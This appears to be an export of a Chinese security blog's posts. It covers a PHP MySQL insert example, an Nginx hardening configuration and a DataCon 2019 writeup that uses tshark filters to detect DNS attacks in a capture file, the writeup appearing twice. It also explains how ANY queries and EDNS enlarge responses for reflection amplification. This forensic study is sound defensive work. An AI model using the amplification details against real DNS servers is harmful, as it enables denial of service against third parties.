在上一个步骤的基础上，继续修改test_sql.php文件： 123456789101112131415161718192021222324&lt;?php$servername = &quot;localhost&quot;;$username = &quot;username&quot;;$password = &quot;password&quot;;$dbname = &quot;myDB&quot;; // 创建连接$conn = new mysqli($servername, $username, $password, $dbname);// 检测连接if ($conn-&gt;connect_error) &#123; die(&quot;连接失败: &quot; . $conn-&gt;connect_error);&#125; $sql = &quot;INSERT INTO MyGuests (firstname, lastname, email)VALUES (&#x27;John&#x27;, &#x27;Doe&#x27;, &#x27;john@example.com&#x27;)&quot;; if ($conn-&gt;query($sql) === TRUE) &#123; echo &quot;新记录插入成功&quot;;&#125; else &#123; echo &quot;Error: &quot; . $sql . &quot;&lt;br&gt;&quot; . $conn-&gt;error;&#125; $conn-&gt;close();?&gt; 运行结果： 服务器加固 本章主要目的是介绍如何通过优化 Nginx 默认配置，提高 Nginx Web 服务器的安全性。其中注释带有ADD是相对于默认配置的新增项。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163user www-data;worker_processes auto;pid /run/nginx.pid;include /etc/nginx/modules-enabled/*.conf;events &#123; worker_connections 768; # multi_accept on;&#125;http &#123; ## # Basic Settings ## sendfile on; tcp_nopush on; tcp_nodelay on; keepalive_timeout 65; types_hash_max_size 2048; ## # 隐藏Nginx版本号 ## server_tokens off; ## # ADD: 通过关闭慢连接来抵御一些DDOS攻击 ## # 读取客户端请求体的超时时间 client_body_timeout 5s; # 读取客户端请求头的超时时间 client_header_timeout 5s; # 超时时间之后会关闭这个连接 keepalive_timeout 75s; ## # ADD: ## # 客户端请求的http头部缓冲区大小 client_header_buffer_size 2k; # 客户端请求的一些比较大的头文件到缓冲区的最大值 large_client_header_buffers 4 4k; ## # ADD: 防止恶意流量的短时间大量请求 ## # 用户的IP地址$binary_remote_addr作为Key，每个IP地址每秒处理10个请求 limit_req_zone $binary_remote_addr zone=ConnLimitZone:10m rate=10r/s; # server_names_hash_bucket_size 64; # server_name_in_redirect off; include /etc/nginx/mime.types; default_type application/octet-stream; ## # SSL Settings # ADD: 要让https和http并存，不能在配置文件中使用ssl on ## # ssl_protocols TLSv1 TLSv1.1 TLSv1.2; # Dropping SSLv3, ref: POODLE # ssl_prefer_server_ciphers on; ## # Logging Settings ## access_log /var/log/nginx/access.log; error_log /var/log/nginx/error.log; ## # Gzip Settings # ADD: 开启gzip提高页面加载速度 ## gzip on; gzip_vary on; gzip_proxied any; gzip_comp_level 6; gzip_buffers 16 8k; gzip_http_version 1.1; gzip_types text/plain text/css application/json application/javascript text/xml application/xml application/xml+rss text/javascript; ## # Virtual Host Configs ## include /etc/nginx/conf.d/*.conf; include /etc/nginx/sites-enabled/*; server &#123; server_name localhost; listen 80; ## # ADD: 清除不安全的HTTP响应头 ## more_clear_headers &quot;X-Powered-By&quot;; more_clear_headers &quot;Server&quot;; more_clear_headers &quot;ETag&quot;; more_clear_headers &quot;Connection&quot;; more_clear_headers &quot;Date&quot;; more_clear_headers &quot;Accept-Ranges&quot;; more_clear_headers &quot;Last-Modified&quot;; ## # ADD: 避免点击劫持 ## add_header X-Frame-Options &quot;SAMEORIGIN&quot;; ## # ADD: 防XSS攻击 ## add_header X-XSS-Protection &quot;1; mode=block&quot;; ## # ADD: 禁用不安全的HTTP方法 ## if ($request_method !~ ^(GET|HEAD|POST)$ ) &#123; return 405; &#125; ## # ADD: 静态资源 ## location ~* \\.(js|css|flash|media|jpg|png|gif|dll|cab|CAB|ico|vbs|json|ttf|woff|eot|map)$ &#123; # 缓存30天 add_header Cache-Control &quot;max-age=2592000&quot;; &#125; ## # ADD: 静态页面 ## location ~* \\.html$ &#123; # 不缓存 add_header Cache-Control &quot;no-cache&quot;; &#125; &#125;&#125;#mail &#123;# # See sample authentication script at:# # http://wiki.nginx.org/ImapAuthenticateWithApachePhpScript# # # auth_http localhost/auth.php;# # pop3_capabilities &quot;TOP&quot; &quot;USER&quot;;# # imap_capabilities &quot;IMAP4rev1&quot; &quot;UIDPLUS&quot;;# # server &#123;# listen localhost:110;# protocol pop3;# proxy on;# &#125;# # server &#123;# listen localhost:143;# protocol imap;# proxy on;# &#125;#&#125; Summary： 在写这篇学习文档之前，我对Nginx服务器安全加固还是处于完全无知的状态，看到参考资料的一些配置都有些云里雾里，但是我又比较喜欢“折腾”，每个阶段成功后都会对虚拟机进行快照，防止环境无法恢复。从上面可以看到，通过修改Nginx的默认配置，可以对Nginx服务器的“先天性”缺陷进行主动防御，比如：关闭版本信息、关闭慢连接、设置静态资源和静态页面的缓存时间等等，这样就可以整体上防止服务器受到常见的攻击。 另外，还可以添加IP白名单和IP黑名单，以及设置Naxsi自定义规则。 Q&amp;A Nginx中sites-available和sites-enabled的区别 sites-available是存放当前的server配置, 在这里修改配置文件； sites-enabled是激活并使用的server配置（从sites_available的文件创建快捷方式到sites-enabled） ln -s命令 具体使用方法 Nginx服务器安全加固参考文档 https://www.cnblogs.com/RiwellAckerman/p/11273705.html https://my.oschina.net/jiaoyanli/blog/1510174 https://blog.csdn.net/JY_He/article/details/52299884 https://bbs.ichunqiu.com/thread-36091-1-1.html","tags":[{"name":"web安全基础","slug":"web安全基础","permalink":"http://ca0y1h.top/tags/web%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/"},{"name":"MySQL","slug":"MySQL","permalink":"http://ca0y1h.top/tags/MySQL/"},{"name":"LEMP","slug":"LEMP","permalink":"http://ca0y1h.top/tags/LEMP/"},{"name":"Nginx","slug":"Nginx","permalink":"http://ca0y1h.top/tags/Nginx/"}],"categories":[{"name":"web安全","slug":"web安全","permalink":"http://ca0y1h.top/categories/web%E5%AE%89%E5%85%A8/"},{"name":"基础学习","slug":"web安全/基础学习","permalink":"http://ca0y1h.top/categories/web%E5%AE%89%E5%85%A8/%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0/"}]},{"title":"Datacon2019-q1-Writeup-v2","date":"2019-07-21T06:15:38.000Z","path":"Web_security/ctf_writeup/2.Datacon2019-q1-Writeup-v2/","text":"Datacon2019-q1-Writeup-v2 这一轮流量分析主要是分析为主，以这篇Writeup为参考，有关DNS的攻击类型、攻击手段和攻击特征，详见[DNS攻击流量分析识别-v1 系统环境 Windows10 64bit； wireshark 3.0.3 (v3.0.3-0-g6130b92b0ec6) ； TShark (Wireshark) 3.0.3 (v3.0.3-0-g6130b92b0ec6)； Cmder 18026 preview； python 3.7； Excel 2016 未授权的Dynamic Update **切入点：**粗略观察绝大部分DNS包的Opcode都是0（Standard Query），但是我们也可以分析Opcode不为零的。使用以下命令筛选： dns and not dns.flags.opcode==0 可以看到，全部都是DNS Dynamic Update请求。接下来，使用在Cmder中使用tshark命令筛选出所有的攻击IP： tshark.exe -r q1_final.pcap -Y &quot;dns.flags.opcode==5 &amp;&amp; dns.flags.response==0&quot; -T fields -e ip.src -e ip.dst |awk '&#123;print $1&quot;-&gt;&quot;$2&#125;' &gt; DynamicDNSip.csv 从图中可以看到有四个攻击来源：19.220.251.87 414，200.152.141.106 15，18.100.48.86 4091，237.205.156.233 535。由于正常的Dynamic Update 不会发送这么多且这么频繁的请求，而且涉及到二级域名com.cn以及很多其他不同域名的更新，因此我们认为这些都是攻击。再使用下面一行命令把他们选出来： tshark.exe -r q1_final.pcap -Y &quot;dns and not dns.flags.opcode == 0 and dns.flags.response == 0&quot; -T fields -e frame.number -e ip.src | awk '&#123;print $1&quot;,5&quot;; ip[$2] += 1&#125;' &gt; DynamicDNS.csv 上述命令把这些攻击包的标号和类型(5) 输出到了DynamicDNS.csv 反射放大攻击 **切入点：**我们接下来再看看除了A(1) 和AAAA(28) 这两个常见类型以外的DNS 请求。使用如下命令启动 wireshark： wireshark -r q1_final.pcap -R &quot;dns and not dns.query.type in &#123;1, 28&#125; and dns.flags.opcode == 0&quot; 如图所示，可以看到有很多杂七杂八的DNS 请求。为便于观察，我们按照请求类型排序。简单浏览一下，我们就能够发现一些攻击。例如，我们可以看到反射放大攻击： 使用以下命令统计各IP的进/出流量： tshark -r q1_final.pcap -T fields -e ip.src -e ip.dst -e frame.len | awk '&#123;send[$1] += $3; rece[$1] += 0; rece[$2] += $3; send[$2] += 0;&#125; END &#123;for(ip in send) if(rece[ip] == 0) tmp = 1e60; else tmp = send[ip]/rece[ip]; for(ip in send) print ip, send[ip], rece[ip], tmp; &#125;' &gt; send_rece.csv 为了更容易观察这些IP的流量特征，可以使用Python的matplotlib模块作图： 1234567891011121314151617181920212223242526import matplotlib.pyplot as pltimport csvsend = []rece = []ip = []with open(&#x27;send_rece.csv&#x27; ,&#x27;r&#x27;) as csvfile: plots = csv.reader(csvfile, delimiter=&#x27; &#x27;) for row in plots: if row[0] == &#x27;45.80.170.1&#x27;: continue send.append(int(row[1])) rece.append(int(row[2])) ip.append(row[0])fig, ax = plt.subplots()ax.scatter(send, rece, label=&#x27;&#x27;)for i, txt in enumerate(ip): if send[i] &gt; 8e6 or rece[i] &gt; 8e6: ax.annotate(txt, (send[i], rece[i]))plt.xlabel(&#x27;send&#x27;)plt.ylabel(&#x27;receive&#x27;)plt.title(&#x27;&#x27;)plt.legend()plt.show() 为什么要排除45.80.170.1： 我们可以使用命令wireshark -r q1_final.pcap -R &quot;dns and ip.addr == 45.80.170.1&quot;查看相关流量： 可以看出这个IP是一个DNS服务。 可以看到到188.141.167.218、70.85.232.160、187.199.129.12 是反射用的递归DNS，而伪造出的源地址127,130.104.152、175.222.102.169、105.191.150.205 则都是受害者。 从图中，102.181.153.79也比较可以，但是使用ip.addr==102.181.153.79可以看出它的请求类型主要是MX、NS和CNAME。 tshark -r q1_final.pcap -Y 'dns.qry.type in &#123;255&#125; and dns.flags.recdesired == 1 and dns.qry.name in &#123;&quot;734a5.gov&quot; &quot;d1a4.cc&quot;&#125; and not dns.flags.response == 1 and ip.src in &#123;127.130.104.152 175.222.102.169 105.191.150.205&#125;' -T fields -e frame.number -e ip.src -e dns.qry.name | awk '&#123;print $1&quot;,3&quot;&#125; &gt; Reflect.csv 上述命令把这些攻击包的标号和类型(3) 输出到了Reflect.csv。 未授权的域传输攻击 继续浏览除了A(1) 和AAAA(28) 以外的DNS 请求，我们看到了未授权的DNS 域传送攻击。 我们用显示过滤器dns.qry.type in &#123;252 251&#125;把AXFR 和IXFR 过滤出来： 可以手工验证，有两个221.223.19.169 和一个129.191.74.107 发来的域传送请求包，以及大量的96.199.230.176 发来的域传送请求包。我们认为前面两个有可能是管理员配置不当等造成的，而最后的一个大量的请求数据包显然就是域传送攻击了。使用以下命令提取出我们认为是攻击的包： tshark -r q1_final.pcap -Y &quot;dns.qry.type in &#123;251 252&#125; and not ip.addr in &#123;221.223.19.169 129.191.74.107&#125; and not dns.flags.response == 1&quot; -T fields -e frame.number -e ip.src | awk '&#123;print $1&quot;,4&quot;; ip[$2] += 1&#125;' &gt; AXFR.csv 上述命令把这些攻击包的标号和类型(4) 输出到了AXFR.csv。 DNSSec NSec 域名遍历 继续浏览除了A(1) 和AAAA(28) 以外的DNS 请求，可以看到DNSSec 域名遍历攻击： 由于域名遍历攻击依赖于NSec，我们可以重新执行 tshark -r q1_final.pcap -R &quot;dns.resp.type == 47 and not dns.qry.type == 255&quot; 从原来的所有包中重新过滤所有涉及到NSec(47) 项的响应数据包： 容易手工验证，在所有的域名遍历攻击中，攻击者只有6.116.183.244 一个人。我们可以用： wireshark -r q1_final.pcap -R &quot;dns and ip.addr == 6.116.183.244&quot; 过滤出6.116.183.244 发送的所有包： 可见所有的攻击包都是SOA 或者DS 类型的。使用以下命令提取出攻击的包 tshark -r q1_final.pcap -Y 'dns and dns.qry.type in &#123;43 6&#125; and dns.flags.response == 0 and ip.src == 6.116.183.244' -T fields -e frame.number -e ip.dst | awk '&#123;print $1&quot;,1&quot;&#125;' &gt; DNSSec.csv Dos子域名遍历攻击 **切入点：**我们可以先统计一下DNS 查询到一个不存在的域名的次数及其请求发起人的IP，具体而言可以使用如下的命令： tshark -r q1_final.pcap -Y &quot;dns and dns.flags.rcode == 3&quot; -T fields -e ip.src -e ip.dst -e dns.qry.name | awk '&#123;ip = $2; doname = substr($3, index($3,&quot;.&quot;), length($3)); c_ip_doname[ip&quot;@@@&quot;doname] += 1&#125; END &#123;for(i in c_ip_doname) print i, c_ip_doname[i]&#125;' &gt; No_such_name.csv ``substr(string, start [, length ])：Return a length-character-long substring of string, starting at character number start. The first character of a string is character number one. `index(str1, str2)： This searches the string str1 for the first occurrences of the string str2, and returns the position in characters where that occurrence begins in the string str1 以域名为排序标准，查看No_such_name.csv： cat No_such_name.csv | sort -k2nr | less 可以看到，144.202.64.226查询了30318次*b0e.com.cn下面不存在的域名，是所有IP中次数最多的。我们可以使用： wireshark -r q1_final.pcap -R &quot;dns and ip.addr == 144.202.64.226&quot; 进一步查看144.202.64.226相关的包： 可以看出，攻击人144.202.64.226 选了182.254.116.116 、119.29.29.29 和223.6.6.6 三个递归DNS 服务器作为中间“跳板”，攻击b0e.com.cn 的权威DNS 服务器。本来攻击者还想利用223.5.5.5 作为“跳板”的，但是看起来这台DNS 服务器没有工作，无法利用。 对于每个子域名，攻击人都访问了两次。第二次明显快于第一次，说明请求确实到达了权威DNS服务器并被递归服务器缓存。 使用下列命令可以提取出攻击的包： tshark -r q1_final.pcap -Y 'dns and dns.flags.response == 0 and ip.src == 144.202.64.226' -T fields -e frame.number -e ip.dst -e dns.qry.name | awk '&#123;print $1&quot;,2&quot;&#125;' &gt; DOS.csv 使用下列命令提取“跳板机器”的dns及其被利用次数： tshark -r q1_final.pcap -Y 'dns and dns.flags.response == 0 and ip.src == 144.202.64.226' -T fields -e frame.number -e ip.dst -e dns.qry.name | awk '&#123;dns[$2] += 1&#125; END &#123;for(ip in dns) print ip, dns[ip]'&#125; 119.29.29.29 15719 182.254.116.116 16227 223.6.6.6 2247 223.5.5.5 1 使用下列命令提取询问次数不是两次的域名： tshark -r q1_final.pcap -Y 'dns and dns.flags.response == 0 and ip.src == 144.202.64.226' -T fields -e frame.number -e ip.dst -e dns.qry.name | awk '&#123;domain[$3] += 1&#125; END &#123;for(i in domain) if(domain[i] != 2) print i, domain[i]&#125;' &gt; query_one_time_domain.csv 我们发现：这些域名要么是Google 的8.8.8.8，访问了四次，用于试探四个“跳板”DNS 递归服务器是否工作；要么是没有收到响应的请求，因此只访问了一次。这间接的说明了受害者的资源已经被消耗了非常多，攻击人对于b0e.com.cn 权威服务器的DoS 攻击是成功的。 分析思路总结 首先查看Opcode不为0，即非Standard Query的查询数据包 特征字段：dns.flags.opcode dns.flags.opcode != 0(Standard query) dns.flags.opcode == 5(Dynamic Update) —&gt; 未授权的DNS Dynamic Update 再查看类型不为A(1)和AAAA(28)，即IPV4和IPV6的查询数据包 特征字段：dns.qry.type dns.qry.type != 1(A) and 28(AAAA) ``dns.qry.type == 255(* ALL)` —&gt; 反射放大攻击 dns.qry.type == 252(AXFR) —&gt; 未授权的DNS域传输攻击 dns.qry.type == 43(DS) and 6(SOA) —&gt; DNSSec 域名遍历攻击 最后可以统计一下返回No Such Name的响应数据包 特征字段：dns.flags.rcode dns.flags.rcode != 0(No Error) dns.flags.rcode == 3(No such name) —&gt; DoS攻击","tags":[{"name":"Wireshark","slug":"Wireshark","permalink":"http://ca0y1h.top/tags/Wireshark/"},{"name":"流量分析","slug":"流量分析","permalink":"http://ca0y1h.top/tags/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/"},{"name":"DNS","slug":"DNS","permalink":"http://ca0y1h.top/tags/DNS/"},{"name":"Datacon2019","slug":"Datacon2019","permalink":"http://ca0y1h.top/tags/Datacon2019/"}],"categories":[{"name":"流量分析","slug":"流量分析","permalink":"http://ca0y1h.top/categories/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/"},{"name":"比赛题","slug":"流量分析/比赛题","permalink":"http://ca0y1h.top/categories/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/%E6%AF%94%E8%B5%9B%E9%A2%98/"}]},{"title":"Datacon2019-q1-Writeup-v2","date":"2019-07-21T06:15:38.000Z","path":"Web_security/traffic_analysis/2.Datacon2019-q1-Writeup-v2/","text":"DataCon 方向一 DNS恶意流量检测 WriteUp Review-v2 这一轮流量分析主要是分析为主，以这篇Writeup为参考，有关DNS的攻击类型、攻击手段和攻击特征，详见DNS攻击流量分析识别-v1 0x00 系统环境 Windows10 64bit； wireshark 3.0.3 (v3.0.3-0-g6130b92b0ec6) ； TShark (Wireshark) 3.0.3 (v3.0.3-0-g6130b92b0ec6)； Cmder 18026 preview； python 3.7； Excel 2016 0x01 未授权的Dynamic Update **切入点：**粗略观察绝大部分DNS包的Opcode都是0（Standard Query），但是我们也可以分析Opcode不为零的。使用以下命令筛选： dns and not dns.flags.opcode==0 可以看到，全部都是DNS Dynamic Update请求。接下来，使用在Cmder中使用tshark命令筛选出所有的攻击IP： tshark.exe -r q1_final.pcap -Y &quot;dns.flags.opcode==5 &amp;&amp; dns.flags.response==0&quot; -T fields -e ip.src -e ip.dst |awk '&#123;print $1&quot;-&gt;&quot;$2&#125;' &gt; DynamicDNSip.csv 从图中可以看到有四个攻击来源：19.220.251.87 414，200.152.141.106 15，18.100.48.86 4091，237.205.156.233 535。由于正常的Dynamic Update 不会发送这么多且这么频繁的请求，而且涉及到二级域名com.cn以及很多其他不同域名的更新，因此我们认为这些都是攻击。再使用下面一行命令把他们选出来： tshark.exe -r q1_final.pcap -Y &quot;dns and not dns.flags.opcode == 0 and dns.flags.response == 0&quot; -T fields -e frame.number -e ip.src | awk '&#123;print $1&quot;,5&quot;; ip[$2] += 1&#125;' &gt; DynamicDNS.csv 上述命令把这些攻击包的标号和类型(5) 输出到了DynamicDNS.csv 0x02 反射放大攻击 **切入点：**我们接下来再看看除了A(1) 和AAAA(28) 这两个常见类型以外的DNS 请求。使用如下命令启动 wireshark： wireshark -r q1_final.pcap -R &quot;dns and not dns.query.type in &#123;1, 28&#125; and dns.flags.opcode == 0&quot; 如图所示，可以看到有很多杂七杂八的DNS 请求。为便于观察，我们按照请求类型排序。简单浏览一下，我们就能够发现一些攻击。例如，我们可以看到反射放大攻击： 使用以下命令统计各IP的进/出流量： tshark -r q1_final.pcap -T fields -e ip.src -e ip.dst -e frame.len | awk '&#123;send[$1] += $3; rece[$1] += 0; rece[$2] += $3; send[$2] += 0;&#125; END &#123;for(ip in send) if(rece[ip] == 0) tmp = 1e60; else tmp = send[ip]/rece[ip]; for(ip in send) print ip, send[ip], rece[ip], tmp; &#125;' &gt; send_rece.csv 为了更容易观察这些IP的流量特征，可以使用Python的matplotlib模块作图： 1234567891011121314151617181920212223242526import matplotlib.pyplot as pltimport csvsend = []rece = []ip = []with open(&#x27;send_rece.csv&#x27; ,&#x27;r&#x27;) as csvfile: plots = csv.reader(csvfile, delimiter=&#x27; &#x27;) for row in plots: if row[0] == &#x27;45.80.170.1&#x27;: continue send.append(int(row[1])) rece.append(int(row[2])) ip.append(row[0])fig, ax = plt.subplots()ax.scatter(send, rece, label=&#x27;&#x27;)for i, txt in enumerate(ip): if send[i] &gt; 8e6 or rece[i] &gt; 8e6: ax.annotate(txt, (send[i], rece[i]))plt.xlabel(&#x27;send&#x27;)plt.ylabel(&#x27;receive&#x27;)plt.title(&#x27;&#x27;)plt.legend()plt.show() 为什么要排除45.80.170.1： 我们可以使用命令wireshark -r q1_final.pcap -R &quot;dns and ip.addr == 45.80.170.1&quot;查看相关流量： 可以看出这个IP是一个DNS服务。 可以看到到188.141.167.218、70.85.232.160、187.199.129.12 是反射用的递归DNS，而伪造出的源地址127,130.104.152、175.222.102.169、105.191.150.205 则都是受害者。 从图中，102.181.153.79也比较可以，但是使用ip.addr==102.181.153.79可以看出它的请求类型主要是MX、NS和CNAME。 tshark -r q1_final.pcap -Y 'dns.qry.type in &#123;255&#125; and dns.flags.recdesired == 1 and dns.qry.name in &#123;&quot;734a5.gov&quot; &quot;d1a4.cc&quot;&#125; and not dns.flags.response == 1 and ip.src in &#123;127.130.104.152 175.222.102.169 105.191.150.205&#125;' -T fields -e frame.number -e ip.src -e dns.qry.name | awk '&#123;print $1&quot;,3&quot;&#125; &gt; Reflect.csv 上述命令把这些攻击包的标号和类型(3) 输出到了Reflect.csv。 0x03 未授权的域传输攻击 继续浏览除了A(1) 和AAAA(28) 以外的DNS 请求，我们看到了未授权的DNS 域传送攻击。 我们用显示过滤器dns.qry.type in &#123;252 251&#125;把AXFR 和IXFR 过滤出来： 可以手工验证，有两个221.223.19.169 和一个129.191.74.107 发来的域传送请求包，以及大量的96.199.230.176 发来的域传送请求包。我们认为前面两个有可能是管理员配置不当等造成的，而最后的一个大量的请求数据包显然就是域传送攻击了。使用以下命令提取出我们认为是攻击的包： tshark -r q1_final.pcap -Y &quot;dns.qry.type in &#123;251 252&#125; and not ip.addr in &#123;221.223.19.169 129.191.74.107&#125; and not dns.flags.response == 1&quot; -T fields -e frame.number -e ip.src | awk '&#123;print $1&quot;,4&quot;; ip[$2] += 1&#125;' &gt; AXFR.csv 上述命令把这些攻击包的标号和类型(4) 输出到了AXFR.csv。 0x04 DNSSec NSec 域名遍历 继续浏览除了A(1) 和AAAA(28) 以外的DNS 请求，可以看到DNSSec 域名遍历攻击： 由于域名遍历攻击依赖于NSec，我们可以重新执行 tshark -r q1_final.pcap -R &quot;dns.resp.type == 47 and not dns.qry.type == 255&quot; 从原来的所有包中重新过滤所有涉及到NSec(47) 项的响应数据包： 容易手工验证，在所有的域名遍历攻击中，攻击者只有6.116.183.244 一个人。我们可以用： wireshark -r q1_final.pcap -R &quot;dns and ip.addr == 6.116.183.244&quot; 过滤出6.116.183.244 发送的所有包： 可见所有的攻击包都是SOA 或者DS 类型的。使用以下命令提取出攻击的包 tshark -r q1_final.pcap -Y 'dns and dns.qry.type in &#123;43 6&#125; and dns.flags.response == 0 and ip.src == 6.116.183.244' -T fields -e frame.number -e ip.dst | awk '&#123;print $1&quot;,1&quot;&#125;' &gt; DNSSec.csv 0x05 Dos子域名遍历攻击 **切入点：**我们可以先统计一下DNS 查询到一个不存在的域名的次数及其请求发起人的IP，具体而言可以使用如下的命令： tshark -r q1_final.pcap -Y &quot;dns and dns.flags.rcode == 3&quot; -T fields -e ip.src -e ip.dst -e dns.qry.name | awk '&#123;ip = $2; doname = substr($3, index($3,&quot;.&quot;), length($3)); c_ip_doname[ip&quot;@@@&quot;doname] += 1&#125; END &#123;for(i in c_ip_doname) print i, c_ip_doname[i]&#125;' &gt; No_such_name.csv ``substr(string, start [, length ])：Return a length-character-long substring of string, starting at character number start. The first character of a string is character number one. `index(str1, str2)： This searches the string str1 for the first occurrences of the string str2, and returns the position in characters where that occurrence begins in the string str1 以域名为排序标准，查看No_such_name.csv： cat No_such_name.csv | sort -k2nr | less 可以看到，144.202.64.226查询了30318次*b0e.com.cn下面不存在的域名，是所有IP中次数最多的。我们可以使用： wireshark -r q1_final.pcap -R &quot;dns and ip.addr == 144.202.64.226&quot; 进一步查看144.202.64.226相关的包： 可以看出，攻击人144.202.64.226 选了182.254.116.116 、119.29.29.29 和223.6.6.6 三个递归DNS 服务器作为中间“跳板”，攻击b0e.com.cn 的权威DNS 服务器。本来攻击者还想利用223.5.5.5 作为“跳板”的，但是看起来这台DNS 服务器没有工作，无法利用。 对于每个子域名，攻击人都访问了两次。第二次明显快于第一次，说明请求确实到达了权威DNS服务器并被递归服务器缓存。 使用下列命令可以提取出攻击的包： tshark -r q1_final.pcap -Y 'dns and dns.flags.response == 0 and ip.src == 144.202.64.226' -T fields -e frame.number -e ip.dst -e dns.qry.name | awk '&#123;print $1&quot;,2&quot;&#125;' &gt; DOS.csv 使用下列命令提取“跳板机器”的dns及其被利用次数： tshark -r q1_final.pcap -Y 'dns and dns.flags.response == 0 and ip.src == 144.202.64.226' -T fields -e frame.number -e ip.dst -e dns.qry.name | awk '&#123;dns[$2] += 1&#125; END &#123;for(ip in dns) print ip, dns[ip]'&#125; 119.29.29.29 15719 182.254.116.116 16227 223.6.6.6 2247 223.5.5.5 1 使用下列命令提取询问次数不是两次的域名： tshark -r q1_final.pcap -Y 'dns and dns.flags.response == 0 and ip.src == 144.202.64.226' -T fields -e frame.number -e ip.dst -e dns.qry.name | awk '&#123;domain[$3] += 1&#125; END &#123;for(i in domain) if(domain[i] != 2) print i, domain[i]&#125;' &gt; query_one_time_domain.csv 我们发现：这些域名要么是Google 的8.8.8.8，访问了四次，用于试探四个“跳板”DNS 递归服务器是否工作；要么是没有收到响应的请求，因此只访问了一次。这间接的说明了受害者的资源已经被消耗了非常多，攻击人对于b0e.com.cn 权威服务器的DoS 攻击是成功的。 0x06 分析思路总结 首先查看Opcode不为0，即非Standard Query的查询数据包 特征字段：dns.flags.opcode dns.flags.opcode != 0(Standard query) dns.flags.opcode == 5(Dynamic Update) —&gt; 未授权的DNS Dynamic Update 再查看类型不为A(1)和AAAA(28)，即IPV4和IPV6的查询数据包 特征字段：dns.qry.type dns.qry.type != 1(A) and 28(AAAA) ``dns.qry.type == 255(* ALL)` —&gt; 反射放大攻击 dns.qry.type == 252(AXFR) —&gt; 未授权的DNS域传输攻击 dns.qry.type == 43(DS) and 6(SOA) —&gt; DNSSec 域名遍历攻击 最后可以统计一下返回No Such Name的响应数据包 特征字段：dns.flags.rcode dns.flags.rcode != 0(No Error) dns.flags.rcode == 3(No such name) —&gt; DoS攻击","tags":[{"name":"Wireshark","slug":"Wireshark","permalink":"http://ca0y1h.top/tags/Wireshark/"},{"name":"流量分析","slug":"流量分析","permalink":"http://ca0y1h.top/tags/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/"},{"name":"DNS","slug":"DNS","permalink":"http://ca0y1h.top/tags/DNS/"},{"name":"Datacon2019","slug":"Datacon2019","permalink":"http://ca0y1h.top/tags/Datacon2019/"}],"categories":[{"name":"流量分析","slug":"流量分析","permalink":"http://ca0y1h.top/categories/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/"},{"name":"比赛题","slug":"流量分析/比赛题","permalink":"http://ca0y1h.top/categories/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/%E6%AF%94%E8%B5%9B%E9%A2%98/"}]},{"title":"Datacon2019-q1-Writeup-v1","date":"2019-07-15T12:44:20.000Z","path":"Web_security/ctf_writeup/1.Datacon2019-q1-Writeup-v1/","text":"Datacon2019-q1-Writeup-v1 这是我写的第一篇博文。 过几个月就要去读研了，暑假期间导师给了我们一个小小的任务：复现2019 Datacon比赛的第一题。之前从来没有接触过流量分析相关的工作，也算是一个全新的开始，在此记录一下别人的思路和复现的过程。 题目说明 题目背景 假如你是某网络的管理员，近日接到告警称，网络中存在 DNS 攻击行为，希望你进行调查。现捕获到网络中的 DNS 流量，请对其中的攻击行为进行分析。 题目要点 DNS是互联网中重要的基础设施之一，对网络的稳定运行有至关重要的作用。然而，由于设计缺陷，DNS 存在诸多脆弱点，因此可被利用与诸多攻击。本题对常见的 DNS 安全问题进行考察。 知识储备 DNS协议及报文格式 这篇文章对于DNS讲的还比较透彻，在此基础做一点摘要。 域名层次结构 域名服务器 另外还有一个本地域名服务器：当一个主机发出DNS查询请求的时候，这个查询请求首先就是发给本地域名服务器的。 域名解析过程 以查询jocent.me为例，其中10.74.36.90为主机IP，10.74.1.11为本地DNS服务器： ①主机10.74.36.90先向本地域名服务器10.74.1.11进行递归查询 ②本地域名服务器采用迭代查询，向一个根域名服务器进行查询 ③根域名服务器告诉本地域名服务器，下一次应该查询的顶级域名服务器dns.me的IP地址 ④本地域名服务器向顶级域名服务器dns.me进行查询 ⑤顶级域名服务器me告诉本地域名服务器，下一步查询权限服务器dns.jocent.me的IP地址 ⑥本地域名服务器向权限服务器dns.jocent.me进行查询 ⑦权限服务器dns.jocent.me告诉本地域名服务器所查询的主机的IP地址 ⑧本地域名服务器最后把查询结果告诉 10.74.36.90 其中有两个概念递归查询和迭代查询: 递归查询：本机向本地域名服务器发出一次查询请求，就静待最终的结果。如果本地域名服务器无法解析，自己会以DNS客户机的身份向其它域名服务器查询，直到得到最终的IP地址告诉本机。 迭代查询：本地域名服务器向根域名服务器查询，根域名服务器告诉它下一步到哪里去查询，然后它再去查，每次它都是以客户机的身份去各个服务器查询。 报文格式 DNS资源记录ANY类型 为什么在DDOS方法攻击的时候需要指定ANY类型参数，我们使用dig命令来看一下具体情况： 可以看到，DNS服务器返回了该服务器中所有关于163.com的资源记录，包括类型A，NS，MX，TXT，这样就使得响应数据包远远大于请求数据包。 我们不妨再往深层次想一想，已知UDP数据包的最大长度是512字节，也就是说当DNS响应数据大于512字节的时候，数据只返回512字节，剩余的数据将被丢弃。为什么在这个地方DNS的响应数据可以返回大于2000字节的数据呢？可以去查看请求数据包中的Additional Records有一条OPT类型的资源记录，OPT类型是一种一个“伪 DNS记录类型”以支持 EDNS协议，其中UDP Payload Size字段可以指定DNS返回报文的最大长度。这里对EDNS有比较详细的解释。 DNS攻击类型 这里有对DNS的各种攻击类型的介绍。 dns.flags.opt常见的值 dns.flags.opcode=0(只显示DNS常规查询消息，以及相应的DNS响应消息) dns.flags.opcode=1(只显示DNS逆向查询消息，以及相应的DNS响应消息) dns.flags.opcode=2(只显示DNS服务器状态请求查询消息，以及相应的DNS服务器状态响应消息) dns.flags.opcode=5(只显示DNS动态更新查询消息，以及相应的DNS动态更新响应消息） DNS资源记录（RR）类型——NS和SOA NS和SOA的区别 SOA，即Start Of Authority，放在 zone file 中，用于描述这个 zone 负责的 name server，version number…等资料，以及当 slave server 要备份这个 zone 时的一些参数。每个 zone file 中必须有且仅有一条 SOARR ，并在 zone file 中作为第一条资源记录保存。 